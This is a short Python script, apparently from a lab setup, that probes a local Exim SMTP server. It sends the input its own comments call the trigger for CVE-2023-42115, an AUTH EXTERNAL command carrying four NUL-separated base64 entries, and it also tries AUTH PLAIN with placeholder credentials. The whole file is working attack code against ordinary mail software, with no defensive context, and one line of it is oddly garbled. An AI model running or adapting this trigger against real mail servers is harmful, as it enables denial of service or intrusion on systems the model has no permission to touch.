#!/usr/bin/env python3
"""Probe Exim SMTP AUTH surface + CVE-2023-42115 seed shape (AUTH EXTERNAL, 4 NUL-separated entries)."""
import socket, base64, sys, time

def recv_until(s, timeout=3):
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(chunk) < 4096:
                break
    except socket.timeout:
        pass
    return data

s = socket.create_connection(("127.0.0.1", 25), timeout=10)
print("[banner]", recv_until(s).decode(errors="replace").strip().splitlines()[:1])
s.sendall(b"EHLO test.local\r\n")
caps = recv_until(s).print if False else recv_until(s)
print("[EHLO caps]")
for line in caps.decode(errors="replace").splitlines():
    print("   ", line)

# CVE-2023-42115 trigger shape: AUTH EXTERNAL b64("i1\0i2\0i3\0i4")
secret = b"i1\x00i2\x00i3\x00i4"
b64 = base64.b64encode(secret).decode()
cmd = f"AUTH EXTERNAL {b64}\r\n".encode()
print("[send]", cmd[:80])
s.sendall(cmd)
resp = recv_until(s)
print("[resp]", resp.decode(errors="replace").strip().splitlines()[:3])

# also probe PLAIN (base64d reachable via plaintext driver if configured)
plain = base64.b64encode(b"\x00user\x00pass").decode()
s.sendall(f"AUTH PLAIN {plain}\r\n".encode())
print("[AUTH PLAIN resp]", recv_until(s).decode(errors="replace").strip().splitlines()[:2])
s.sendall(b"QUIT\r\n")
s.close()
